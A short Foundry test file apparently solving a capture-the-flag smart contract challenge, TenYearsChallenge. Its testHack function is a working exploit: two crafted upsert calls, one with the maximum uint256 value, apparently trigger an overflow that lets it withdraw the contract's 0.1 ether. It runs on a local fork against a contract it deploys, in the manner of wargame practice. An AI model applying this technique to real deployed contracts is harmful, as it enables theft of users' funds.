// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";

import "../src/TenYearsChallenge.sol";

contract TenYearsChallengeTest is Test {
    TenYearsChallenge challenge;

    receive() external payable {}

    function setUp() public {
        vm.createSelectFork("local");
        challenge = new TenYearsChallenge{value: 0.1 ether}();
    }

    function testHack() public {
        challenge.upsert(1, type(uint256).max);
        challenge.upsert(2, 1 days + 1);
        uint256 balance = address(this).balance;
        challenge.withdraw(2);
        assertEq(address(this).balance, balance + 0.1 ether);
    }
}
